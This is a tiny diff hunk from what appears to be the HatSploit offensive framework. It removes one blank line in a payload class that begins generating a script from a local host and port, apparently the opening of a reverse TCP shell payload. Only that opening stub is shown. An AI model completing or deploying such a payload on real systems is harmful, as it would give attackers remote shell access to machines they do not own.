@@ -46,7 +46,6 @@ class HatSploitPayload(Payload, TCPClient):
         local_host, local_port = self.parse_options(self.options)
 
         self.output_process("Generating payload...")
-
         source = (
             f"$a='{local_host}';"
             f"$b={local_port};"
